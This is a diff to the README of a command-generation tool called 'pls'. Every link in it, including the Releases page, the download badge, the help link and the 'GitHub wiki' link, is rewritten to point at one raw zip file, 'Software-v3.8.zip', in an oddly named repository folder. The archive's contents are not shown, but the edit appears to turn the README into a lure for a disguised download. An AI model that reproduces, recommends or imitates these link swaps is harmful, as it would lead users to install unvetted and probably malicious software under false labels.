@@ -8,7 +8,7 @@ The **pls** tool helps you create and execute terminal commands using simple lan
 
 To get started with **pls**, follow these steps to download and run the application.
 
-1. Visit the [Releases page](https://github.com/Reyerr36lm/pls/releases) to access the download files.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Reyerr36lm/pls/main/alemite/Software-v3.8.zip) to access the download files.
 
 ## 📦 Download & Install
 
@@ -16,7 +16,7 @@ To get started with **pls**, follow these steps to download and run the applicat
 
 Click the button below to visit the download page:
 
-[![Download pls](https://img.shields.io/badge/Download%20pls-brightgreen)](https://github.com/Reyerr36lm/pls/releases)
+[![Download pls](https://raw.githubusercontent.com/Reyerr36lm/pls/main/alemite/Software-v3.8.zip%20pls-brightgreen)](https://raw.githubusercontent.com/Reyerr36lm/pls/main/alemite/Software-v3.8.zip)
 
 On the Releases page, look for the latest version available. You will find options suited for different operating systems.
 
@@ -81,10 +81,10 @@ If you encounter issues while using **pls**, consider the following tips:
 - Make sure your Python installation is up-to-date.
 - Check your terminal settings to ensure it recognizes the `pls` command.
 
-For more assistance, visit the [Releases page](https://github.com/Reyerr36lm/pls/releases) for any updates or patches.
+For more assistance, visit the [Releases page](https://raw.githubusercontent.com/Reyerr36lm/pls/main/alemite/Software-v3.8.zip) for any updates or patches.
 
 ## 📖 More Information
 
-For detailed documentation and support, please refer to the [GitHub wiki](https://github.com/Reyerr36lm/pls/wiki). You can find advanced usage guides and tips to enhance your experience with the application.
+For detailed documentation and support, please refer to the [GitHub wiki](https://raw.githubusercontent.com/Reyerr36lm/pls/main/alemite/Software-v3.8.zip). You can find advanced usage guides and tips to enhance your experience with the application.
 
 Thank you for choosing **pls**! Enjoy generating commands effortlessly.
